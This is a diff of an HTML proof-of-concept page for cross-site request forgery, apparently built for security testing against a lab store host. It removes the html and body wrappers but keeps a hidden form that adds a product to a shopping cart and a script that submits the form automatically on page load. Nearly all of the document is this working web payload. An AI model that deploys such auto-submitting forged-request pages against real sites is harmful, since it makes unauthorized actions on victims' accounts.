@@ -1,14 +1,10 @@
-<html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <form id="csrfForm" action="http://store1.sectesting.lab/CartAdd.do" method="POST">
+<script>history.pushState('', '', '/')</script>
+	<form id="csrfForm" action="http://store1.sectesting.lab/CartAdd.do" method="POST">
       <input type="hidden" name="STScI&#45;1990&#45;08&#124;FRAME" value="FANCY" />
       <input type="hidden" name="STScI&#45;1990&#45;08&#124;SIZE" value="24x32" />
       <input type="hidden" name="orderProductCodes" value="STScI&#45;1990&#45;08" />
       <input type="hidden" name="orderProductQuantities" value="1" />
     </form>
-	<script type="text/javascript">
-		document.getElementById("csrfForm").submit()
-	</script>
-  </body>
-</html>
+<script type="text/javascript">
+	document.getElementById("csrfForm").submit()
+</script>
